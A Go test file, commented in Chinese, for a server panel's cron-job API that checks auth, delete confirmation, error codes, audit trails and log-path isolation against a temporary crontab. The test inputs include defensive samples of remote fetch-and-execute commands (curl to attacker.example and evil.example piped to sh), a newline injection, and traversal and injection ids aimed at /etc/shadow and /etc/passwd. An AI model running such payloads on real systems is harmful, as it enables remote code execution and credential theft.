package server

import (
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"lipanel/internal/cron"
)

// ============================================================================
// 计划任务接口层测试（阶段五 5.2）
// ============================================================================
//
// 这一层要验证的不是「表达式解析对不对」（那是 internal/cron 的事），
// 而是六件接口契约：
//
//	① 路由注册顺序：固定段不能被通配吃掉；
//	② 全部接口都要登录；
//	③ **删除必须带 confirm，否则 428**（服务端强制二次确认）；
//	④ 未注册路径返回 JSON 404（而不是 SPA 的 200 + HTML）；
//	⑤ 审计里留下**命令原文**与备份路径（安全底线的唯一可见证据）；
//	⑥ 并发冲突 409 / 表达式不支持 409 / 输入非法 400 ——
//	   三者的下一步动作完全不同，状态码不能混。
//
// ########## 全程不碰宿主机 crontab ##########
//
// Manager 一律用 Options.FilePath 指向 t.TempDir() 里的文件（隔离文件模式）。
// 一次真实的 `crontab` 命令都不会执行——这是计划里的安全红线，
// 也是 4.6 假执行器、4.5 LIPANEL_STORE_* 的同一条纪律。

// ---------------------------------------------------------------------------
// 测试脚手架
// ---------------------------------------------------------------------------

type cronTestEnv struct {
	server  *Server
	manager *cron.Manager
	dir     string
	tabFile string
}

func newCronTestServer(t *testing.T, mut func(*cron.Options)) *cronTestEnv {
	t.Helper()
	dir := t.TempDir()
	tab := filepath.Join(dir, "crontab")

	opts := cron.Options{
		FilePath: tab,
		DataDir:  filepath.Join(dir, "data"),
		Logger:   slog.New(slog.NewTextHandler(io.Discard, nil)),
		// 固定时钟：否则「下次执行时间」的断言会随测试运行时刻漂移。
		Now: func() time.Time { return time.Date(2026, 3, 5, 10, 0, 0, 0, time.Local) },
	}
	if mut != nil {
		mut(&opts)
	}
	m, err := cron.NewManager(opts)
	if err != nil {
		t.Fatalf("构造 cron.Manager 失败: %v", err)
	}

	base := newAuthedTestServer(t)
	s, err := New(Options{
		Addr:     "127.0.0.1:0",
		Logger:   slog.New(slog.NewTextHandler(io.Discard, nil)),
		Version:  "test",
		Auth:     base.auth,
		WebFS:    testFS(),
		WebBuilt: true,
		Cron:     m,
	})
	if err != nil {
		t.Fatalf("构造 Server 失败: %v", err)
	}
	return &cronTestEnv{server: s, manager: m, dir: dir, tabFile: tab}
}

// mustCreate 新增一条任务并返回其 id。
func (e *cronTestEnv) mustCreate(t *testing.T, cookie *http.Cookie, expr, cmd, comment string) (string, map[string]any) {
	t.Helper()
	rec := doJSON(t, e.server, http.MethodPost, "/api/cron/jobs", map[string]any{
		"expression": expr, "command": cmd, "comment": comment,
	}, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("新增应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var out map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("解析新增响应失败: %v (%s)", err, rec.Body.String())
	}
	job, _ := out["job"].(map[string]any)
	if job == nil || job["id"] == nil {
		t.Fatalf("新增响应缺少 job.id：%v", out)
	}
	return job["id"].(string), out
}

// ---------------------------------------------------------------------------
// ① 鉴权：全部接口都要登录
// ---------------------------------------------------------------------------

func TestCronRoutesRequireAuth(t *testing.T) {
	env := newCronTestServer(t, nil)
	paths := []struct{ method, path string }{
		{http.MethodGet, "/api/cron"},
		{http.MethodGet, "/api/cron/jobs"},
		{http.MethodPost, "/api/cron/jobs"},
		{http.MethodPut, "/api/cron/jobs/aaaaaaaaaaaa"},
		{http.MethodDelete, "/api/cron/jobs/aaaaaaaaaaaa?confirm=true"},
		{http.MethodGet, "/api/cron/jobs/aaaaaaaaaaaa/logs"},
		{http.MethodPost, "/api/cron/validate"},
		{http.MethodGet, "/api/cron/audit"},
		{http.MethodGet, "/api/cron/nope"},
	}
	for _, p := range paths {
		rec := doJSON(t, env.server, p.method, p.path, nil)
		if rec.Code != http.StatusUnauthorized {
			t.Errorf("%s %s 未登录应 401，实际 %d", p.method, p.path, rec.Code)
		}
	}
}

// ---------------------------------------------------------------------------
// ② 路由顺序：固定段不能被通配吃掉
// ---------------------------------------------------------------------------

// TestCronFixedSegmentRoutesNotShadowed 锁死注册顺序。
//
// /api/cron/audit 与 /api/cron/validate 都是 /api/cron/jobs/{id} 的兄弟段，
// 一旦将来有人加了 /api/cron/{seg} 通配并排在前面，
// 审计页会变成「任务 audit 不存在」——这是 4.1~4.6 踩过七次的坑。
func TestCronFixedSegmentRoutesNotShadowed(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	for _, path := range []string{"/api/cron", "/api/cron/jobs", "/api/cron/audit"} {
		rec := doJSON(t, env.server, http.MethodGet, path, nil, cookie)
		if rec.Code != http.StatusOK {
			t.Errorf("GET %s 应 200（被通配吃掉时是 400/404），实际 %d：%s",
				path, rec.Code, rec.Body.String())
		}
	}
	rec := doJSON(t, env.server, http.MethodPost, "/api/cron/validate",
		map[string]any{"expression": "*/5 * * * *"}, cookie)
	if rec.Code != http.StatusOK {
		t.Errorf("POST /api/cron/validate 应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	if out["valid"] != true {
		t.Errorf("合法表达式应 valid=true，实际响应：%v", out)
	}
}

// ---------------------------------------------------------------------------
// ③ 完整链路：列表 → 新增 → 编辑 → 日志 → 删除
// ---------------------------------------------------------------------------

func TestCronFullLifecycleOverHTTP(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	// 空列表：文件还不存在，必须返回 200 + 空数组，而不是 404 或 500。
	rec := doJSON(t, env.server, http.MethodGet, "/api/cron/jobs", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("空列表应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var empty map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &empty); err != nil {
		t.Fatal(err)
	}
	if arr, ok := empty["jobs"].([]any); !ok || len(arr) != 0 {
		t.Errorf("空 crontab 的 jobs 应是空数组，实际 %v", empty["jobs"])
	}
	if empty["mode"] != "file" {
		t.Errorf("mode 应是 file，实际 %v", empty["mode"])
	}

	// 新增：命令原文含引号与管道，验证包装脚本这条路径不受影响。
	const cmd = `find /var/log -name '*.log' -mtime +7 -delete | wc -l`
	id, created := env.mustCreate(t, cookie, "*/10 2-4 * * 1-5", cmd, "清理旧日志")
	job, _ := created["job"].(map[string]any)
	if job["managed"] != true {
		t.Errorf("新建任务应 managed=true，实际 %v", job["managed"])
	}
	if job["next_run"] == nil || job["next_run"] == "" {
		t.Errorf("应给出下次执行时间，实际响应：%v", created)
	}
	if job["command"] != cmd {
		t.Errorf("命令原文应完整回显，实际 %v", job["command"])
	}

	// crontab 文件里是「标记注释 + 包装脚本调用」两行，命令不在其中。
	raw, err := os.ReadFile(env.tabFile)
	if err != nil {
		t.Fatalf("读隔离 crontab 失败: %v", err)
	}
	tab := string(raw)
	if !strings.Contains(tab, "# lipanel:"+id) {
		t.Errorf("crontab 应有标记注释，实际:\n%s", tab)
	}
	if !strings.Contains(tab, "/bin/sh '") {
		t.Errorf("crontab 应调用包装脚本，实际:\n%s", tab)
	}
	if strings.Contains(tab, "-mtime +7") {
		t.Errorf("用户命令不该出现在 crontab 行里（应只待在包装脚本中）:\n%s", tab)
	}
	// 包装脚本已生成，且用户命令原样成行。
	scriptBody, err := os.ReadFile(filepath.Join(env.dir, "data", "jobs", id+".sh"))
	if err != nil {
		t.Fatalf("包装脚本应已生成: %v", err)
	}
	if !strings.Contains(string(scriptBody), cmd) {
		t.Errorf("包装脚本应含命令原文，实际:\n%s", scriptBody)
	}
	info, err := os.Stat(filepath.Join(env.dir, "data", "jobs", id+".sh"))
	if err == nil && info.Mode().Perm()&0o077 != 0 {
		t.Errorf("包装脚本权限不应过宽，实际 %v", info.Mode().Perm())
	}

	// 编辑：表达式改掉，id 保持不变（否则日志与审计关联会断）。
	rec = doJSON(t, env.server, http.MethodPut, "/api/cron/jobs/"+id,
		map[string]any{"expression": "0 3 * * 0", "command": cmd, "comment": "每周日 3 点"}, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("编辑应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var upd map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &upd)
	if uj, _ := upd["job"].(map[string]any); uj == nil || uj["id"] != id {
		t.Errorf("编辑后 id 应保持不变，实际 %v", upd["job"])
	}
	if uj, _ := upd["job"].(map[string]any); uj != nil && uj["expression"] != "0 3 * * 0" {
		t.Errorf("表达式应已更新，实际 %v", uj["expression"])
	}

	// 日志：任务还没被 cron 跑过 → 200 + found=false + 可读原因。
	rec = doJSON(t, env.server, http.MethodGet, "/api/cron/jobs/"+id+"/logs", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("日志接口应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var logs map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &logs)
	if logs["found"] != false {
		t.Errorf("未执行过的任务 found 应为 false，实际 %v", logs)
	}
	if reason, _ := logs["reason"].(string); reason == "" {
		t.Error("found=false 时必须给出原因，否则用户以为日志丢了")
	}

	// 删除：不带 confirm → 428；带 confirm → 200 且任务与脚本都消失。
	rec = doJSON(t, env.server, http.MethodDelete, "/api/cron/jobs/"+id,
		map[string]any{"confirm": false}, cookie)
	if rec.Code != http.StatusPreconditionRequired {
		t.Fatalf("不带 confirm 的删除应 428，实际 %d：%s", rec.Code, rec.Body.String())
	}

	rec = doJSON(t, env.server, http.MethodDelete, "/api/cron/jobs/"+id+"?confirm=true", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("带 confirm 的删除应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	after, err := os.ReadFile(env.tabFile)
	if err != nil {
		t.Fatalf("读 crontab 失败: %v", err)
	}
	if strings.Contains(string(after), id) {
		t.Errorf("删除后 crontab 仍残留该任务:\n%s", after)
	}
	if _, err := os.Stat(filepath.Join(env.dir, "data", "jobs", id+".sh")); !os.IsNotExist(err) {
		t.Error("删除任务后包装脚本必须一并清理（否则留下一个无人引用的可执行文件）")
	}
	// 备份必须存在：这是「改坏了去哪找」的唯一答案。
	bak := filepath.Join(env.dir, "data", "backups", "crontab.last.bak")
	if _, err := os.Stat(bak); err != nil {
		t.Errorf("删除应留下备份 %s: %v", bak, err)
	}
}

// ---------------------------------------------------------------------------
// ④ 删除的二次确认是**服务端**强制的
// ---------------------------------------------------------------------------

func TestCronDeleteRequiresConfirm(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)
	id, _ := env.mustCreate(t, cookie, "*/5 * * * *", "echo hi", "")

	// body 里不给 confirm
	rec := doJSON(t, env.server, http.MethodDelete, "/api/cron/jobs/"+id, map[string]any{}, cookie)
	if rec.Code != http.StatusPreconditionRequired {
		t.Fatalf("应 428，实际 %d：%s", rec.Code, rec.Body.String())
	}
	if rec.Header().Get("X-Lipanel-Confirm-Required") != "true" {
		t.Error("428 应带 X-Lipanel-Confirm-Required 头，便于前端与脚本识别")
	}
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	if hint, _ := out["hint"].(string); !strings.Contains(hint, "confirm=true") {
		t.Errorf("428 的 hint 要告诉调用方怎么补，实际 %v", out["hint"])
	}

	// query 里写 confirm=false 同样不算确认（不能被 "confirm=0" 糊过去）
	rec = doJSON(t, env.server, http.MethodDelete, "/api/cron/jobs/"+id+"?confirm=false", nil, cookie)
	if rec.Code != http.StatusPreconditionRequired {
		t.Fatalf("confirm=false 应仍 428，实际 %d", rec.Code)
	}

	// 被拒绝的删除**零副作用**
	body, _ := os.ReadFile(env.tabFile)
	if !strings.Contains(string(body), id) {
		t.Error("428 之后任务必须原样保留")
	}
}

// ---------------------------------------------------------------------------
// ⑤ 收编：编辑非面板行
// ---------------------------------------------------------------------------

func TestCronUpdateAdoptsUnmanagedLine(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	// 先往隔离文件里塞一行「用户在 crontab -e 里手写的任务」。
	if err := os.WriteFile(env.tabFile,
		[]byte("MAILTO=ops@example.com\n0 1 * * * /usr/local/bin/backup.sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rec := doJSON(t, env.server, http.MethodGet, "/api/cron/jobs", nil, cookie)
	var list map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &list)
	jobs, _ := list["jobs"].([]any)
	if len(jobs) != 1 {
		t.Fatalf("应解析出 1 条任务，实际 %v", list["jobs"])
	}
	first := jobs[0].(map[string]any)
	if first["managed"] != false {
		t.Errorf("手写行应 managed=false，实际 %v", first["managed"])
	}
	rawLine, _ := first["raw"].(string)
	if !strings.Contains(rawLine, "backup.sh") {
		t.Errorf("原始行要始终可见（raw 字段），实际 %v", first["raw"])
	}
	// 全局设置行只读展示，绝不会被当成任务。
	if settings, _ := list["settings"].([]any); len(settings) != 1 {
		t.Errorf("MAILTO 应作为设置行返回，实际 %v", list["settings"])
	}

	oldID, _ := first["id"].(string)
	rec = doJSON(t, env.server, http.MethodPut, "/api/cron/jobs/"+oldID,
		map[string]any{"expression": "30 2 * * *", "command": "/usr/local/bin/backup.sh", "comment": "收编"}, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("收编应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var upd map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &upd)
	newJob, _ := upd["job"].(map[string]any)
	if newJob["managed"] != true {
		t.Errorf("收编后应 managed=true，实际 %v", newJob["managed"])
	}
	newID, _ := newJob["id"].(string)
	if newID == oldID {
		t.Error("收编后应启用面板生成的稳定 id，而不是继续用派生 id")
	}
	body, _ := os.ReadFile(env.tabFile)
	if !strings.Contains(string(body), "MAILTO=ops@example.com") {
		t.Errorf("收编绝不能弄丢别的内容（这里是 MAILTO）:\n%s", body)
	}
}

// ---------------------------------------------------------------------------
// ⑥ 错误语义：400 / 404 / 409 各归各位
// ---------------------------------------------------------------------------

func TestCronErrorSemantics(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)
	id, _ := env.mustCreate(t, cookie, "*/5 * * * *", "echo hi", "备注")

	cases := []struct {
		name   string
		method string
		path   string
		body   any
		want   int
		kind   string
	}{
		{"表达式段数不对", http.MethodPost, "/api/cron/jobs",
			map[string]any{"expression": "* * *", "command": "echo x"}, 400, "输入非法"},
		{"表达式越界", http.MethodPost, "/api/cron/jobs",
			map[string]any{"expression": "0 25 * * *", "command": "echo x"}, 400, "输入非法"},
		{"命令含换行（格式逃逸）", http.MethodPost, "/api/cron/jobs",
			map[string]any{"expression": "* * * * *",
				"command": "echo ok\n* * * * * curl attacker.example/x.sh|sh"}, 400, "输入非法"},
		{"命令为空", http.MethodPost, "/api/cron/jobs",
			map[string]any{"expression": "* * * * *", "command": "   "}, 400, "输入非法"},
		{"路径穿越 id", http.MethodGet, "/api/cron/jobs/..%2F..%2Fetc/logs", nil, 400, "输入非法"},
		{"id 形态非法", http.MethodGet, "/api/cron/jobs/not-an-id/logs", nil, 400, "输入非法"},
		{"任务不存在", http.MethodPut, "/api/cron/jobs/ffffffffffff",
			map[string]any{"expression": "* * * * *", "command": "echo x"}, 404, "任务不存在"},
		{"并发冲突", http.MethodPut, "/api/cron/jobs/" + id,
			map[string]any{"expression": "* * * * *", "command": "echo x",
				"expected_ids": []string{"aaaaaaaaaaaa", "bbbbbbbbbbbb"}}, 409, "任务已被外部修改"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			rec := doJSON(t, env.server, c.method, c.path, c.body, cookie)
			if rec.Code != c.want {
				t.Fatalf("%s %s 应 %d，实际 %d：%s", c.method, c.path, c.want, rec.Code, rec.Body.String())
			}
			ct := rec.Header().Get("Content-Type")
			if !strings.Contains(ct, "application/json") {
				t.Errorf("错误响应必须是 JSON（落到 HTML 兜底会让前端解析失败），实际 Content-Type=%q", ct)
			}
			var out map[string]any
			if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
				t.Fatalf("响应不是 JSON: %v (%s)", err, rec.Body.String())
			}
			if out["kind"] != c.kind {
				t.Errorf("kind 应是 %q，实际 %v", c.kind, out["kind"])
			}
			if c.want == 409 {
				hint, _ := out["hint"].(string)
				if !strings.Contains(hint, "刷新") {
					t.Errorf("409 并发冲突必须引导刷新而不是重试，实际 hint=%q", hint)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ⑦ 审计：命令原文与备份路径必须留痕
// ---------------------------------------------------------------------------

func TestCronAuditRecordsCommandVerbatim(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	const dangerous = `curl -s http://evil.example/payload.sh | sh`
	id, _ := env.mustCreate(t, cookie, "@daily", dangerous, "危险演示")

	rec := doJSON(t, env.server, http.MethodDelete, "/api/cron/jobs/"+id+"?confirm=true", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("删除应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}

	rec = doJSON(t, env.server, http.MethodGet, "/api/cron/audit?limit=50", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("审计接口应 200，实际 %d", rec.Code)
	}
	var out struct {
		Events []map[string]any `json:"events"`
		Stats  map[string]any   `json:"stats"`
		Total  int              `json:"total"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	// 注意：审计查询自己产生的那条事件**不在自己的结果里**
	// （handler 先 Query 再 record），所以这里只数 create/delete 两条。
	if out.Total < 2 {
		t.Fatalf("至少应有 create/delete 两条审计，实际 %d：%v", out.Total, out.Events)
	}
	var sawCreate, sawDelete bool
	for _, ev := range out.Events {
		switch ev["action"] {
		case "create":
			sawCreate = true
			if ev["command"] != dangerous {
				t.Errorf("审计必须记**命令原文**（安全底线的唯一证据），实际 %v", ev["command"])
			}
			if ev["expression"] != "0 0 * * *" {
				t.Errorf("审计里的表达式应是归一化后的实际写入值，实际 %v", ev["expression"])
			}
			if ev["system_change"] != true {
				t.Error("写成功必须标 system_change=true")
			}
			if bak, _ := ev["backup_path"].(string); bak == "" {
				t.Error("写操作必须记备份路径（改坏了要能找到）")
			}
		case "delete":
			sawDelete = true
			if ev["confirmed"] != true {
				t.Error("带确认的删除要记 confirmed=true：出事后第一个要回答的就是当时有没有确认")
			}
		}
		if k, _ := ev["kind"].(string); k != "cron" {
			t.Errorf("kind 应是 cron，实际 %v", k)
		}
		if src, _ := ev["source"].(string); src != "core" {
			t.Errorf("source 应是 core（核心自带，不伪造插件 ID），实际 %v", src)
		}
	}
	if !sawCreate || !sawDelete {
		t.Errorf("审计缺少 create/delete：%v", out.Events)
	}
}

// TestCronAuditRecordsDenied 验证「被拒绝的越权尝试」同样留痕。
func TestCronAuditRecordsDenied(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	// 一个不存在的 id + 不带 confirm 的删除：先被 428 挡下。
	doJSON(t, env.server, http.MethodDelete, "/api/cron/jobs/eeeeeeeeeeee", nil, cookie)

	rec := doJSON(t, env.server,
		http.MethodGet, "/api/cron/audit?outcome=denied", nil, cookie)
	var out struct {
		Events []map[string]any `json:"events"`
	}
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	if len(out.Events) == 0 {
		t.Fatal("被拒绝的请求必须留痕：越权探测是唯一的安全信号来源")
	}
	for _, ev := range out.Events {
		if ev["outcome"] != "denied" {
			t.Errorf("outcome 过滤失效，混进了 %v", ev["outcome"])
		}
	}
}

// ---------------------------------------------------------------------------
// ⑧ 未注册路径 / 未注入管理器
// ---------------------------------------------------------------------------

func TestCronUnknownPathReturnsJSON404(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)
	rec := doJSON(t, env.server, http.MethodGet, "/api/cron/definitely-not-a-route", nil, cookie)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("应 404，实际 %d", rec.Code)
	}
	var out map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("必须是 JSON 而不是 SPA 的 HTML：%v (%s)", err, rec.Body.String())
	}
	if av, _ := out["available"].([]any); len(av) == 0 {
		t.Error("404 应列出可用接口，便于排查路径写错")
	}
}

func TestCronWithoutManagerIs503(t *testing.T) {
	base := newAuthedTestServer(t)
	s, err := New(Options{
		Addr:     "127.0.0.1:0",
		Logger:   slog.New(slog.NewTextHandler(io.Discard, nil)),
		Version:  "test",
		Auth:     base.auth,
		WebFS:    testFS(),
		WebBuilt: true,
		// 故意不注入 Cron
	})
	if err != nil {
		t.Fatal(err)
	}
	cookie := login(t, s)
	for _, p := range []string{"/api/cron", "/api/cron/jobs", "/api/cron/whatever"} {
		rec := doJSON(t, s, http.MethodGet, p, nil, cookie)
		if rec.Code != http.StatusServiceUnavailable {
			t.Errorf("未注入管理器时 GET %s 应 503，实际 %d", p, rec.Code)
		}
		if ct := rec.Header().Get("Content-Type"); !strings.Contains(ct, "application/json") {
			t.Errorf("GET %s 必须是 JSON 503，实际 %q", p, ct)
		}
	}
}

// ---------------------------------------------------------------------------
// ⑨ 状态接口：降级不是错误
// ---------------------------------------------------------------------------

func TestCronStatusReportsModeAndTarget(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	rec := doJSON(t, env.server, http.MethodGet, "/api/cron", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("状态接口应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	st, _ := out["status"].(map[string]any)
	if st == nil {
		t.Fatalf("响应缺少 status：%v", out)
	}
	// 用户必须一眼看清「面板在改谁的任务」——这是本模块最重要的一行说明。
	target, _ := st["target"].(string)
	if !strings.Contains(target, "隔离文件") {
		t.Errorf("隔离模式必须写明不是系统 crontab，实际 target=%q", target)
	}
	if st["available"] != true {
		t.Errorf("隔离文件应 available=true，实际 %v", st["available"])
	}
	if out["confirm_required"] != true {
		t.Error("接口要自描述「删除需要 confirm」，让调用方不必试一次 428 才知道")
	}
	if perms, _ := out["permissions"].([]any); len(perms) == 0 {
		t.Error("应回显当前用户的权限（仅作体验优化）")
	}
}

// TestCronStatusUnavailableIsNotAnError 锁死降级策略：
// 没装 cron 时状态接口仍 200，只是 available=false + 原因 + 指引。
func TestCronStatusUnavailableIsNotAnError(t *testing.T) {
	dir := t.TempDir()
	m, err := cron.NewManager(cron.Options{
		CrontabBin: "definitely-not-here-xyz",
		DataDir:    filepath.Join(dir, "data"),
		Logger:     slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatalf("没装 cron 不该让管理器构造失败: %v", err)
	}
	base := newAuthedTestServer(t)
	s, err := New(Options{
		Addr: "127.0.0.1:0", Logger: slog.New(slog.NewTextHandler(io.Discard, nil)),
		Version: "test", Auth: base.auth, WebFS: testFS(), WebBuilt: true, Cron: m,
	})
	if err != nil {
		t.Fatal(err)
	}
	cookie := login(t, s)

	rec := doJSON(t, s, http.MethodGet, "/api/cron", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("「没装 cron」是状态不是错误，应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	if out["available"] != false {
		t.Errorf("应 available=false，实际 %v", out["available"])
	}
	if r, _ := out["reason"].(string); !strings.Contains(r, "cron") {
		t.Errorf("要给出可读原因，实际 %q", r)
	}
	if hint, _ := out["install_hint"].(string); !strings.Contains(hint, "cronie") {
		t.Errorf("不可用时要给安装指引，实际 %q", hint)
	}

	// 但具体操作接口仍必须 503（真的做不了事）。
	rec = doJSON(t, s, http.MethodGet, "/api/cron/jobs", nil, cookie)
	if rec.Code != http.StatusServiceUnavailable {
		t.Errorf("crontab 不可用时列表应 503，实际 %d：%s", rec.Code, rec.Body.String())
	}
}

// ---------------------------------------------------------------------------
// ⑩ 日志接口的路径不能由外部指定
// ---------------------------------------------------------------------------

func TestCronLogsRejectsForeignPaths(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	// 日志路径必须只能由面板从 id 反推。开一个 ?path= 就等于
	// 「登录即可读 root 的任意文件」，因此这里的判据只有一条：
	// **任何形态的外部路径都不会被当成日志路径读取**。
	//
	// 写法说明：id 里带空格与 '/' 时必须 URL 转义，否则请求根本构造不出来；
	// 而 Go 的 ServeMux 会先规范化并 301 重定向含 ".." 的路径，
	// 那同样没有读到任何文件——两种拦法都算通过，关键是别 200、别泄露内容。
	payloads := []string{
		"../../../../etc/shadow",
		"..%2F..%2Fetc%2Fshadow",
		"a; cat /etc/passwd",
		"aaaaaaaaaaaag", // 13 位：形态不对
		"aaaaaaaaaaa",   // 11 位：形态不对
		"AAAAAAAAAAAA",  // 大写：面板只生成小写 hex
		"u-zzzzzzzzzzzz",
		"",
	}
	for _, id := range payloads {
		target := "/api/cron/jobs/" + url.PathEscape(id) + "/logs?path=/etc/shadow"
		rec := doJSON(t, env.server, http.MethodGet, target, nil, cookie)
		if rec.Code == http.StatusOK {
			t.Errorf("id=%q 竟然返回 200，日志路径必须只能由面板反推", id)
		}
		body := rec.Body.String()
		for _, leak := range []string{"root:", "daemon:", "$6$"} {
			if strings.Contains(body, leak) {
				t.Errorf("id=%q 的响应泄露了 /etc/shadow 或 /etc/passwd 的内容：%s", id, body)
			}
		}
		// 301/307 是 Go ServeMux 对含 ".." 或重复斜杠路径的**规范化重定向**：
		// 请求根本没到达 handler，也就没读任何文件，与 4.3/4.4 观察到的一致。
		// 除此之外（含我们自己的 400/404）一律必须是 JSON。
		if rec.Code != http.StatusMovedPermanently && rec.Code != http.StatusTemporaryRedirect {
			if ct := rec.Header().Get("Content-Type"); !strings.Contains(ct, "application/json") {
				t.Errorf("id=%q 的错误必须是 JSON（不能落到 SPA 的 HTML），实际 %d %q",
					id, rec.Code, ct)
			}
		}
	}

	// 直接给一个合法形态但**不是面板任务**的派生 id：也不是 200 之外的读文件。
	rec := doJSON(t, env.server, http.MethodGet,
		"/api/cron/jobs/u-0123456789ab/logs?path=/etc/shadow", nil, cookie)
	if rec.Code == http.StatusOK {
		var out map[string]any
		_ = json.Unmarshal(rec.Body.Bytes(), &out)
		if found, _ := out["found"].(bool); found {
			t.Errorf("不存在的任务却读到日志，说明日志路径可被外部左右：%v", out)
		}
	}
}

// TestCronLogsUnmanagedJobExplainsWhy 非面板任务没有包装脚本，
// 要如实说明「为什么没有日志」，而不是返回一个空日志让人以为「跑了但没输出」。
func TestCronLogsUnmanagedJobExplainsWhy(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)
	if err := os.WriteFile(env.tabFile, []byte("0 1 * * * /usr/local/bin/x.sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rec := doJSON(t, env.server, http.MethodGet, "/api/cron/jobs", nil, cookie)
	var list map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &list)
	jobs, _ := list["jobs"].([]any)
	if len(jobs) != 1 {
		t.Fatalf("应有 1 条任务：%v", list["jobs"])
	}
	uid, _ := jobs[0].(map[string]any)["id"].(string)

	rec = doJSON(t, env.server, http.MethodGet, "/api/cron/jobs/"+uid+"/logs", nil, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("非面板任务的日志查询应 200 + 原因，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	if out["found"] != false {
		t.Errorf("非面板任务没有面板日志，found 应 false，实际 %v", out)
	}
	if reason, _ := out["reason"].(string); !strings.Contains(reason, "编辑") {
		t.Errorf("要告诉用户怎么办（编辑一次即可启用日志），实际 %q", reason)
	}
}

// ---------------------------------------------------------------------------
// ⑪ 表达式预览：与列表同一份语义
// ---------------------------------------------------------------------------

func TestCronValidatePreview(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	rec := doJSON(t, env.server, http.MethodPost, "/api/cron/validate",
		map[string]any{"expression": "@daily"}, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("应 200，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var out struct {
		Valid   bool `json:"valid"`
		Preview struct {
			Expression string   `json:"expression"`
			Runs       []string `json:"runs"`
			Human      string   `json:"human"`
			Reboot     bool     `json:"reboot"`
		} `json:"preview"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	if !out.Valid {
		t.Fatal("@daily 应合法")
	}
	// @ 别名在写回前必须展开成 5 段式（否则用户 crontab -e 看到的与面板不一致）。
	if out.Preview.Expression != "0 0 * * *" {
		t.Errorf("@daily 应归一化为 0 0 * * *，实际 %q", out.Preview.Expression)
	}
	if len(out.Preview.Runs) != 5 {
		t.Errorf("应给出 5 次预览，实际 %d 条：%v", len(out.Preview.Runs), out.Preview.Runs)
	}
	// 预览的时间必须与固定时钟（2026-03-05 10:00）一致，
	// 证明用的是 Manager 注入的时钟而不是接口层自己的 time.Now。
	if len(out.Preview.Runs) > 0 && !strings.HasPrefix(out.Preview.Runs[0], "2026-03-06T00:00:00") {
		t.Errorf("预览第一次应是 2026-03-06T00:00:00，实际 %v", out.Preview.Runs)
	}
	if out.Preview.Human == "" {
		t.Error("常见表达式应给出中文描述")
	}

	// @reboot：合法但没有日历时间。
	rec = doJSON(t, env.server, http.MethodPost, "/api/cron/validate",
		map[string]any{"expression": "@reboot"}, cookie)
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	if !out.Valid || !out.Preview.Reboot || len(out.Preview.Runs) != 0 {
